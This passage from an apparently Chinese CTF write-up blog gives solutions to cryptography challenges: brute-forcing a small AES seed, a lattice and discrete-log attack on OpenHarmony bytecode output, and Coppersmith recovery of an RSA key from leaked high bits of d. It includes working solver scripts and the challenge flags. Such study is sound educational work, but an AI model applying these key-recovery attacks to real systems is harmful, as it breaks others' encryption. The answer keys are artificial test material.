class="line">check=hashlib.sha256(flag.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()    </span><br><span class="line"><span class="built_in">print</span>(check)  </span><br><span class="line"><span class="comment">#enc=a4d1a3d4a4c5eee0834449f1ed4539b3b29157825d0dbfa51e84525bb00ed5b5f462e994a2c742baa5fb90977507983c  </span></span><br><span class="line"><span class="comment">#check=063043351f9576f5ffeaa565da8edf70dad688fd8b406742fa166de432d1ae27</span></span><br></pre></td></tr></table></figure><p>注意到产生随机数的种子是一个小于等于0xFFFF的非负整数和一个小于等于0xFF的非负整数拼接而成的，所以可以考虑爆破，而由<code>padding</code>函数的实现可以发现这里是在消息的前面拼接的，而且flag的长度是32，所以密文的第一块对应的是拼接的数据，那么我们可以将密文的第一块当作IV拿来解密，所以只需要遍历seed尝试用生成的key进行解密即可：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random  </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES  </span><br><span class="line"><span class="keyword">import</span> hashlib  </span><br><span class="line">  </span><br><span class="line">ct = <span class="string">&quot;a4d1a3d4a4c5eee0834449f1ed4539b3b29157825d0dbfa51e84525bb00ed5b5f462e994a2c742baa5fb90977507983c&quot;</span>  </span><br><span class="line">check = <span class="string">&quot;063043351f9576f5ffeaa565da8edf70dad688fd8b406742fa166de432d1ae27&quot;</span>  </span><br><span class="line">iv0 = <span class="built_in">bytes</span>.fromhex(ct[:<span class="number">32</span>])  </span><br><span class="line">ct0 = <span class="built_in">bytes</span>.fromhex(ct[<span class="number">32</span>:])  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> entropy_part1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xFFFF</span> + <span class="number">1</span>):  </span><br><span class="line">    <span class="keyword">for</span> entropy_part2 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xFF</span> + <span class="number">1</span>):  </span><br><span class="line">        final_seed = entropy_part1 + (entropy_part2 &lt;&lt; <span class="number">8</span>)  </span><br><span class="line">        random.seed(final_seed)  </span><br><span class="line">  </span><br><span class="line">        key = random.getrandbits(<span class="number">128</span>)  </span><br><span class="line">        key_bytes = key.to_bytes(<span class="number">16</span>, byteorder=<span class="string">&#x27;big&#x27;</span>)  </span><br><span class="line">        aes = AES.new(key_bytes, AES.MODE_CBC, iv=iv0)  </span><br><span class="line">  </span><br><span class="line">        tmp = aes.decrypt(ct0)  </span><br><span class="line">        <span class="keyword">if</span> hashlib.sha256(tmp).hexdigest() == check:  </span><br><span class="line">            <span class="built_in">print</span>(tmp.decode(<span class="string">&#x27;utf-8&#x27;</span>))  </span><br><span class="line">            exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>可以得到flag：<code>0428f4ff1a4e3d2e2326552f9db48fa9</code></p><h2 id="simple-lll">Simple LLL</h2><p>首先进行方舟字节码逆向，可以见到Index里面有关于flag的如下代码： <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;#runMixer(Object functionObject, Object newTarget, Index <span class="built_in">this</span>) &#123;</span><br><span class="line">        obj = <span class="built_in">this</span>.flag;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="built_in">this</span>.flag.length &lt; <span class="number">6</span> ? <span class="number">1</span> : <span class="number">0</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.output = <span class="string">&quot;Flag too short!&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (istrue((<span class="string">&quot;flag&#123;&quot;</span> != obj.substring(<span class="number">0</span>, <span class="number">5</span>) ? <span class="number">1</span> : <span class="number">0</span>)) != <span class="literal">null</span> || isfalse((<span class="string">&quot;&#125;&quot;</span> != obj[obj.length - <span class="number">1</span>] ? <span class="number">1</span> : <span class="number">0</span>)) == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.output = <span class="string">&quot;Invalid flag, must starts with `flag&#123;` and ends with `&#125;`&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        substring = obj.substring(<span class="number">5</span>, obj.length - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ((<span class="number">0</span> != (substring.length % <span class="number">3</span>) ? <span class="number">1</span> : <span class="number">0</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.output = <span class="string">&quot;Invalid key length (must be multiple of 3)&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        i = <span class="number">0</span>;</span><br><span class="line">        getPrime = <span class="built_in">this</span>.getPrime(<span class="number">215</span>);</span><br><span class="line">        getPrime2 = <span class="built_in">this</span>.getPrime(<span class="number">128</span>);</span><br><span class="line">        getPrime3 = <span class="built_in">this</span>.getPrime(<span class="number">170</span>);</span><br><span class="line">        r36 = [Object];</span><br><span class="line">        obj2 = getiterator(<span class="string">&quot;Lattice-based cryptography is the generic term for constructions of cryptographic primitives that involve lattices, either in the construction itself or in the security proof.&quot;</span>.substring(<span class="number">0</span>, <span class="number">50</span>));</span><br><span class="line">        obj3 = obj2.next;</span><br><span class="line">        i2 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            callthisN = obj3();</span><br><span class="line">            throw.ifnotobject(callthisN);</span><br><span class="line">            <span class="keyword">if</span> (istrue(callthisN.done) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            r362 = callthisN.value;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                bytesToLong = <span class="built_in">this</span>.bytesToLong(substring[i] + substring[i + <span class="number">1</span>] + substring[i + <span class="number">2</span>]);</span><br><span class="line">                i += <span class="number">3</span>;</span><br><span class="line">                r362 = (i &gt;= substring.length ? <span class="number">1</span> : <span class="number">0</span>);</span><br><span class="line">                <span class="keyword">if</span> (r362 != <span class="number">0</span>) &#123;</span><br><span class="line">                    i = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                r36.push((<span class="built_in">this</span>.getRandomBits(<span class="number">190</span>) * getPrime) + ((<span class="built_in">this</span>.modPow(getPrime2, bytesToLong, getPrime3) * BigInt(r362.charCodeAt(<span class="number">0</span>))) % getPrime3));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ExceptionI0 unused) &#123;</span><br><span class="line">                z = r362;</span><br><span class="line">                <span class="keyword">if</span> (istrue(i2) == <span class="literal">null</span>) &#123;</span><br><span class="line">                    i2 = <span class="number">1</span>;</span><br><span class="line">                    obj4 = <span class="literal">null</span>;</span><br><span class="line">                    r363 = hole;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        obj5 = obj2.return;</span><br><span class="line">                        obj3 = obj5;</span><br><span class="line">                        r363 = (<span class="number">0</span> == obj5 ? <span class="number">1</span> : <span class="number">0</span>);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (ExceptionI0 unused2) &#123;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (r363 == <span class="number">0</span>) &#123;</span><br><span class="line">                        obj4 = obj3();</span><br><span class="line">                        <span class="keyword">throw</span>(z);</span><br><span class="line">                        throw.ifnotobject(obj4);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">throw</span>(z);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.output = <span class="string">&quot;P: &quot;</span> + getPrime3 + <span class="string">&quot;, G: &quot;</span> + getPrime2 + <span class="string">&quot;\nEncrypted: [&quot;</span> + r36.join(<span class="string">&quot;, &quot;</span>) + <span class="string">&quot;]&quot;</span>;</span><br><span class="line">        console.error(<span class="string">&quot;P: &quot;</span> + getPrime3 + <span class="string">&quot;&quot;</span>);</span><br><span class="line">        console.error(<span class="string">&quot;G: &quot;</span> + getPrime2 + <span class="string">&quot;&quot;</span>);</span><br><span class="line">        i3 = <span class="number">0</span>;</span><br><span class="line">        obj6 = getiterator(r36);</span><br><span class="line">        obj7 = obj6.next;</span><br><span class="line">        i4 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            callthisN2 = obj7();</span><br><span class="line">            throw.ifnotobject(callthisN2);</span><br><span class="line">            <span class="keyword">if</span> (istrue(callthisN2.done) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            r364 = callthisN2.value;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                console.error(<span class="string">&quot;result[&quot;</span> + i3 + <span class="string">&quot;]: &quot;</span> + r36[i3] + <span class="string">&quot;&quot;</span>);</span><br><span class="line">                r364 = i3 + <span class="number">1</span>;</span><br><span class="line">                i3 = r364;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ExceptionI0 unused3) &#123;</span><br><span class="line">                z2 = r364;</span><br><span class="line">                <span class="keyword">if</span> (istrue(i4) == <span class="literal">null</span>) &#123;</span><br><span class="line">                    i4 = <span class="number">1</span>;</span><br><span class="line">                    obj8 = <span class="literal">null</span>;</span><br><span class="line">                    r365 = hole;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        obj9 = obj6.return;</span><br><span class="line">                        obj7 = obj9;</span><br><span class="line">                        r365 = (<span class="number">0</span> == obj9 ? <span class="number">1</span> : <span class="number">0</span>);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (ExceptionI0 unused4) &#123;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (r365 == <span class="number">0</span>) &#123;</span><br><span class="line">                        obj8 = obj7();</span><br><span class="line">                        <span class="keyword">throw</span>(z2);</span><br><span class="line">                        throw.ifnotobject(obj8);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">throw</span>(z2);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure> 可以知道<span class="math inline">\(P\)</span>是一个170位的质数，<span class="math inline">\(G\)</span>是一个128位的质数，还会生成一个215位的质数（记为<span class="math inline">\(p_0\)</span>），对于flag，首先程序会将flag外面包裹的<code>flag&#123;&#125;</code>去除，然后将剩余部分分为若干个长度为3的字串，设对应数值为<span class="math inline">\(x_1,x_2,\cdots\)</span>，对于<span class="math inline">\(x_i\)</span>（<span class="math inline">\(i=1,2,\cdots\)</span>），有： <span class="math display">\[c_i=q_ip_0+[s_iG^{x_i}\mod{P}]\]</span> 其中<span class="math inline">\(s_i\)</span>为<code>Lattice-based cryptography is the generic term for constructions of cryptographic primitives that involve lattices, either in the construction itself or in the security proof.</code>这段话的前50个字符中的第<span class="math inline">\(i\)</span>个字符对应的ASCII码值，<span class="math inline">\(q_i\)</span>为一个随机的190位整数，设<span class="math inline">\(s_iG^{x_i}\mod{P}=r_i\)</span>，设一共有<span class="math inline">\(n\)</span>次这样的运算，则可以得到： <span class="math display">\[\begin{cases}c_1=q_1p_0+r_1\\c_2=q_2p_0+r_2\\\cdots\\c_n=q_np_0+r_n\\\end{cases}\]</span> 显然这是AGCD问题，<span class="math inline">\(r_i\)</span>大约为170位，那么可以构造如下格： <span class="math display">\[\left(\begin{matrix}2^{171}&amp;c_2&amp;c_3&amp;\cdots&amp;c_{n}\\&amp;-c_1&amp;&amp;&amp;\\&amp;&amp;-c_1&amp;&amp;\\&amp;&amp;&amp;\ddots&amp;\\&amp;&amp;&amp;&amp;-c_1\end{matrix}\right)\]</span> 规约后可以得到一条短向量： <span class="math display">\[(2^{171}q_1,q_1r_2-q_2r_1,\cdots,q_1r_n-q_nr_0)\]</span> 提取第一个分量就可以得到<span class="math inline">\(q_1\)</span>，从而可以从<span class="math inline">\(c_1\)</span>中提取出<span class="math inline">\(r_1\)</span>（有<span class="math inline">\(c_1\equiv r_1\pmod{q_1}\)</span>），从而恢复出<span class="math inline">\(p_0\)</span>。 在获取<span class="math inline">\(p_0\)</span>之后可以知道对于<span class="math inline">\(i=1,2,\cdots,n\)</span>，有<span class="math inline">\(r_i=c_i\mod{p_0}\)</span>（因为<span class="math inline">\(r_1&lt;p_0\)</span>），有： <span class="math display">\[r_i\equiv s_iG^{x_i}\pmod{P}\]</span> 因为<span class="math inline">\(s_i\)</span>是已知量，所以可以知道： <span class="math display">\[G^{x_i}\equiv r_is_i^{-1}\pmod{P}\]</span> 因为<span class="math inline">\(x_i\)</span>相对较小，所以通过求解DLP就可以得到所有<span class="math inline">\(x_i\)</span>，从而恢复出flag： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"></span><br><span class="line">P = <span class="number">1105340037553808473854838067251286973932436127087387</span></span><br><span class="line">G = <span class="number">258698882868391024376029756014412783703</span></span><br><span class="line">ct = [...]</span><br><span class="line"></span><br><span class="line">x0 = ct[<span class="number">0</span>]</span><br><span class="line">x = ct[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">L = matrix(ZZ, <span class="built_in">len</span>(x) + <span class="number">1</span>, <span class="built_in">len</span>(x) + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">L[<span class="number">0</span>, <span class="number">0</span>] = <span class="number">2</span>^<span class="number">171</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">    L[<span class="number">0</span>, i+<span class="number">1</span>] = x[i]</span><br><span class="line">    L[i+<span class="number">1</span>, i+<span class="number">1</span>] = -x0</span><br><span class="line"></span><br><span class="line">res = L.LLL()</span><br><span class="line">q0 = res[<span class="number">0</span>, <span class="number">0</span>] // <span class="number">2</span>^<span class="number">171</span></span><br><span class="line">r0 = ZZ(x0 % q0)</span><br><span class="line">p = ZZ((x0 - r0) // q0)</span><br><span class="line"></span><br><span class="line">R = GF(P)</span><br><span class="line"></span><br><span class="line">text = <span class="string">&quot;Lattice-based cryptography is the generic term for constructions of cryptographic primitives that involve lattices, either in the construction itself or in the security proof.&quot;</span></span><br><span class="line">flag = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="built_in">len</span>(ct)):</span><br><span class="line">    b = ct[i] % p</span><br><span class="line">    y = b * inverse(<span class="built_in">ord</span>(text[i]), P) % P</span><br><span class="line">    x = discrete_log(R(y), R(G))</span><br><span class="line">    flag += long_to_bytes(x)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure> 可以得到：</p><figure><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog20250610001715964.png" alt="Pasted image 20250608172515" /><figcaption>Pasted image 20250608172515</figcaption></figure><p>可以看到这里得到的实际上是flag重复多次的结果，从中可以提取出真正的flag：<code>b5f1a6ca7c28f8ee14b6ca289ed2f061f0f0a01c67e77</code>，包上<code>flag&#123;&#125;</code>就可以了。</p><h2 id="ea5y_rsa">Ea5y_RSA</h2><p>题目描述： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这是一个未完全开发的OpenHarmony应用，在hint.txt中泄露了部分日志记录。请根据给定的源码和日志记录得到flag</span><br></pre></td></tr></table></figure> 日志如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">05-15 18:42:52.831   20328-20328   C03951/InputKeyFlow             com.example.ea5y_rsa  I     [(100000:100000:scope)] Id:1513, click 0 up, state: 0</span><br><span class="line">05-15 18:42:52.831   20328-20328   C0391e/AceGesture               com.example.ea5y_rsa  I     [(100000:100000:scope)] Click try accept</span><br><span class="line">05-15 18:42:52.831   20328-20328   C03951/InputKeyFlow             com.example.ea5y_rsa  I     [(100000:100000:scope)] Click accepted, tag: Button</span><br><span class="line">05-17 18:42:52.848   20328-20328   A03d00/JSAPP                    com.example.ea5y_rsa  I     my gift: 0,48,13,6,9,42,134,72,134,247,13,1,1,1,5,0,4,130,2,98,48,130,2,94,2,1,0,2,129,129,0,162,241,252,198,79,226,203,150,170,211,175,5,127,220,154,215,250,190,125,3,43,15,214,239,122,148,175,20,208,173,241,85,168,92,181,110,220,162,25,205,159,96,119,180,19,33,9,52,34,137,4,102,166,195,142,204,1,247,140,141,184,92,14,162,123,208,160,102,112,154,194,130,104,139,141,10,54,148,160,164,100,245,208,41,39,103,160,135,99,108,15,231,219,255,249,35,114,131,108,70,144,182,118,253,222,115,181,71,155,70,135,141,36,73,221,205,146,31,8,55,181,46,111,127,208,101,185,221,2,3,1,0,1,2,129,128,43,13,141,32,72,211,63,191,155,123,58,239,85,13,80,204,104,48,20,143,213,188,229,169,120,213,248,60,163,182,145,225,116,14,170,209,147,242,48,167,39,201,49,87,159,6,71,140,66,227,185,9,246,94,13,72,209,236,58,114,231,151,75,54,47,89,245,211,248,113,162,189,101,189,68,168,165,3,221,23,176,183,78,56,179,150,198,63,126,131,223,165,239,32,59,158,187,205,223,211,228,55,107,19,136,241,169,206,131,34,95,225</span><br><span class="line">05-15 18:42:52.848   20328-20328   C03951/InputKeyFlow             com.example.ea5y_rsa  I     [(100000:100000:scope)] id: 0, log: &#123;types: Click, node: Button, prcd: Down, state: READY, prcd: Up, state: SUCCEED&#125;</span><br><span class="line">05-15 18:42:52.848   20328-20328   C03919/AceInputTracking         com.example.ea5y_rsa  I     [(100000:100000:scope)] Consumed new event id=1513 in ace_container, lastEventInfo: id:-1</span><br><span class="line">05-15 18:42:52.874   20328-20721   C01406/OHOS::RS                 com.example.ea5y_rsa  I     RSUIDirector::ProcessMessages messageId:3, cmdCount:1, instanceId:100000</span><br><span class="line">05-15 18:42:52.874   20328-20328   C01406/OHOS::RS                 com.example.ea5y_rsa  I     RSUIDirector::PostTask messageId:3, cmdCount:1, instanceId:100000</span><br></pre></td></tr></table></figure> 重点在于<code>my gift</code>一段，将其转换为十六进制可以得到： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00300d06092a864886f70d0101010500048202623082025e02010002818100a2f1fcc64fe2cb96aad3af057fdc9ad7fabe7d032b0fd6ef7a94af14d0adf155a85cb56edca219cd9f6077b41321093422890466a6c38ecc01f78c8db85c0ea27bd0a066709ac282688b8d0a3694a0a464f5d0292767a087636c0fe7dbfff92372836c4690b676fdde73b5479b46878d2449ddcd921f0837b52e6f7fd065b9dd02030100010281802b0d8d2048d33fbf9b7b3aef550d50cc6830148fd5bce5a978d5f83ca3b691e1740eaad193f230a727c931579f06478c42e3b909f65e0d48d1ec3a72e7974b362f59f5d3f871a2bd65bd44a8a503dd17b0b74e38b396c63f7e83dfa5ef203b9ebbcddfd3e4376b1388f1a9ce83225fe1</span><br></pre></td></tr></table></figure> 仔细查看可以看到有一段<code>3082025e</code>，猜测这是RSA的公钥文件或者私钥文件，提取分块有： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00300d06092a864886f70d010101050004820262</span><br><span class="line"></span><br><span class="line">3082025e</span><br><span class="line"></span><br><span class="line">020100</span><br><span class="line"></span><br><span class="line">0281 # n</span><br><span class="line">81</span><br><span class="line">00a2f1fcc64fe2cb96aad3af057fdc9ad7fabe7d032b0fd6ef7a94af14d0adf155a85cb56edca219cd9f6077b41321093422890466a6c38ecc01f78c8db85c0ea27bd0a066709ac282688b8d0a3694a0a464f5d0292767a087636c0fe7dbfff92372836c4690b676fdde73b5479b46878d2449ddcd921f0837b52e6f7fd065b9dd</span><br><span class="line"></span><br><span class="line">0203 # e</span><br><span class="line">010001</span><br><span class="line"></span><br><span class="line">0281 # d</span><br><span class="line">80</span><br><span class="line">2b0d8d2048d33fbf9b7b3aef550d50cc6830148fd5bce5a978d5f83ca3b691e1740eaad193f230a727c931579f06478c42e3b909f65e0d48d1ec3a72e7974b362f59f5d3f871a2bd65bd44a8a503dd17b0b74e38b396c63f7e83dfa5ef203b9ebbcddfd3e4376b1388f1a9ce83225fe1</span><br></pre></td></tr></table></figure> 可以看到有<span class="math inline">\(n,e\)</span>还有<span class="math inline">\(d\)</span>的高位，显然是<span class="math inline">\(d\)</span>高位泄露，参考<a href="https://tangcuxiaojikuai.xyz/post/4a67318c.html#11">2024-高校密码挑战赛赛题一-wp-crypto | 糖醋小鸡块的blog</a>所介绍的方法，大致思路就是设<span class="math inline">\(d=d_h+d_l\)</span>（其中<span class="math inline">\(d_h\)</span>为<span class="math inline">\(d\)</span>已知的高位），构造： <span class="math display">\[e(d_h+d_l)=k\varphi(n)+1=k(n-p-q+1)+1\]</span> 因为<span class="math inline">\(d_h\)</span>已经包含了绝大部分<span class="math inline">\(d\)</span>，那么可以通过： <span class="math display">\[k= \left\lfloor\frac{e\cdot d_h}{n}\right\rfloor+1\]</span> 得到<span class="math inline">\(k\)</span>，那么在模<span class="math inline">\(ed_h\)</span>下可以构造如下多项式： <span class="math display">\[f(x,y)=1+k(n-y)-ex\pmod{ed_h}\]</span> 通过多元Coppersmith方法可以求出与<span class="math inline">\(p+q-1\)</span>大小接近的小根<span class="math inline">\(x_0\)</span>，再通过构造实数方程<span class="math inline">\(f=x(x_0+x)-n=0\)</span>得到<span class="math inline">\(p\)</span>的高位，最后再通过Coppersmith恢复<span class="math inline">\(p\)</span>从而求解出flag。</p><p>但是现在缺的是密文，题目给出的工程文件还没用到，可以在<code>Ea5y_rsa\entry\src\main\ets\pages\Index.ets</code>中找到密文：</p><figure><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog20250610001723107.png" alt="Pasted image 20250609111129" /><figcaption>Pasted image 20250609111129</figcaption></figure><p>处理一下就可以通过如下代码求解出flag：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">import</span> itertools  </span><br><span class="line"></span><br><span class="line">c = <span class="number">0x9e5453388afb3fad55c5e34388fb4577ae5508125684a96948c17e83b1626f75581d961cfe480d59e14748cbdc82ca96b8109f32407dd123d00d1ea12af6b1858aea2c083ff3ead15aa65b2fb8570f7b36240f7657cce0c75f2bf7399e912dbc5224d44d4643924021864ad616f771de0aa0c46c23fe5f835fcd92b478b2c8ea</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">n = <span class="number">0xa2f1fcc64fe2cb96aad3af057fdc9ad7fabe7d032b0fd6ef7a94af14d0adf155a85cb56edca219cd9f6077b41321093422890466a6c38ecc01f78c8db85c0ea27bd0a066709ac282688b8d0a3694a0a464f5d0292767a087636c0fe7dbfff92372836c4690b676fdde73b5479b46878d2449ddcd921f0837b52e6f7fd065b9dd</span></span><br><span class="line">dhigh = <span class="number">0x2b0d8d2048d33fbf9b7b3aef550d50cc6830148fd5bce5a978d5f83ca3b691e1740eaad193f230a727c931579f06478c42e3b909f65e0d48d1ec3a72e7974b362f59f5d3f871a2bd65bd44a8a503dd17b0b74e38b396c63f7e83dfa5ef203b9ebbcddfd3e4376b1388f1a9ce83225fe100000000000000000000000000000000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">small_roots</span>(<span class="params">f, bounds, m=<span class="number">1</span>, d=<span class="literal">None</span></span>):  </span><br><span class="line">    <span class="keyword">import</span> itertools  </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> d:  </span><br><span class="line">        d = f.degree()  </span><br><span class="line">    R = f.base_ring()  </span><br><span class="line">    N = R.cardinality()  </span><br><span class="line">    k = ZZ(f.coefficients().pop(<span class="number">0</span>))  </span><br><span class="line">    g = gcd(k, N)  </span><br><span class="line">    k = R(k/g)  </span><br><span class="line">  </span><br><span class="line">    f *= <span class="number">1</span>/k  </span><br><span class="line">    f = f.change_ring(ZZ)  </span><br><span class="line">    G = <span class="type">Sequence</span>([], f.parent())  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m + <span class="number">1</span>):  </span><br><span class="line">        base = N ^ (m - i) * f ^ i  </span><br><span class="line">        <span class="keyword">for</span> shifts <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(d), repeat=f.nvariables()):  </span><br><span class="line">            g = base * prod(<span class="built_in">map</span>(power, f.variables(), shifts))  </span><br><span class="line">            G.append(g)  </span><br><span class="line">    B, monomials = G.coefficients_monomials()  </span><br><span class="line">    monomials = vector(monomials)  </span><br><span class="line">    factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]  </span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):  </span><br><span class="line">        B.rescale_col(i, factor)  </span><br><span class="line">    B = B.dense_matrix().LLL()  </span><br><span class="line">    B = B.change_ring(QQ)  </span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):  </span><br><span class="line">        B.rescale_col(i, <span class="number">1</span> / factor)  </span><br><span class="line">    H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))  </span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, B * monomials):  </span><br><span class="line">        H.append(h)  </span><br><span class="line">        I = H.ideal()  </span><br><span class="line">        <span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:  </span><br><span class="line">            H.pop()  </span><br><span class="line">        <span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:  </span><br><span class="line">            roots = []  </span><br><span class="line">            <span class="keyword">for</span> root <span class="keyword">in</span> I.variety(ring=ZZ):  </span><br><span class="line">                root = <span class="built_in">tuple</span>(R(root[var]) <span class="keyword">for</span> var <span class="keyword">in</span> f.variables())  </span><br><span class="line">                roots.append(root)  </span><br><span class="line">            <span class="keyword">return</span> roots  </span><br><span class="line">    <span class="keyword">return</span> []  </span><br><span class="line">  </span><br><span class="line">k = dhigh*e//n+<span class="number">1</span>  </span><br><span class="line">hbits = <span class="number">130</span>  </span><br><span class="line">  </span><br><span class="line">R.&lt;x,y&gt; = Zmod(e*dhigh)[]  </span><br><span class="line">f = <span class="number">1</span> + k*(n + <span class="number">1</span> - y) - e*x  </span><br><span class="line">bounds = (<span class="number">2</span>^hbits, <span class="number">2</span>^<span class="number">500</span>)  </span><br><span class="line">  </span><br><span class="line">res = small_roots(f, bounds, m = <span class="number">2</span>, d = <span class="number">2</span>)  </span><br><span class="line"><span class="built_in">print</span>(res)  </span><br><span class="line">leak = <span class="built_in">int</span>(res[<span class="number">0</span>][<span class="number">1</span>])  </span><br><span class="line">  </span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(RealField(<span class="number">1000</span>))  </span><br><span class="line">f = x*(leak-x) - n   </span><br><span class="line">ph = <span class="built_in">int</span>(f.roots()[<span class="number">0</span>][<span class="number">0</span>])  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))  </span><br><span class="line">f = ph + x  </span><br><span class="line">res = f.small_roots(X=<span class="number">2</span>^(hbits+<span class="number">6</span>), beta=<span class="number">0.499</span>,epsilon=<span class="number">0.02</span>)[<span class="number">0</span>]  </span><br><span class="line">p = <span class="built_in">int</span>(ph + res)  </span><br><span class="line">q = n // p  </span><br><span class="line">d = inverse(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))  </span><br><span class="line">  </span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)  </span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><p>可以得到flag：</p><figure><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog20250610001729071.png" alt="Pasted image 20250608220155" /><figcaption>Pasted image 20250608220155</figcaption></figure><p>实际上通过审计代码可以知道<code>getGift</code>代码如下：</p><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">getGift</span>(): <span class="built_in">number</span>[]&#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="attr">gift</span>: <span class="built_in">number</span>[] = [<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">keyPair</span> != <span class="literal">null</span>)&#123;</span><br><span class="line">      <span class="keyword">let</span> pri = <span class="variable language_">this</span>.<span class="property">keyPair</span>.<span class="property">priKey</span>.<span class="title function_">getEncoded</span>().<span class="property">data</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">let</span> <span class="attr">i</span>: <span class="built_in">number</span> = <span class="number">7</span>; i &lt; <span class="number">285</span>; i++)&#123;</span><br><span class="line">        gift.<span class="title function_">push</span>(pri[i]);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> gift;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>其实就是将私钥文件的前面一部分放到日志里面.</p><h2 id="small-message-for-sm4-encryption">Small Message For (SM4) Encryption</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmssl <span class="keyword">import</span> sm4, 